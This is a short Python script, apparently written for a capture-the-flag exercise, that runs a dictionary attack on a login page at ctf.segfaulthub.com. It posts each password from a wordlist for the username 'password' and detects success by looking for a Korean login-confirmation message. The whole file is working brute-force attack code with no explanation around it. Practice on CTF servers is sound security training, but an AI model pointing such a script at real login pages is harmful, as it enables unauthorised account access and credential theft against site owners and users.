import requests

url = "http://ctf.segfaulthub.com:5005/login%20case%201/login_ok.php"
with open("wordlist.txt", "r") as f:
    lines = f.readlines()
    for line in lines:
        line = line.strip()
        payloads = {"id": "password", "pw": line}
        resp = requests.post(url, data=payloads)
        result = resp.text.find("로그인되었습니다.")
        if result > 0:
            print(f"dictionaryAttack Success : {line}")
            break
        else:
            print(f"dictionaryAttack Fail : {line}")
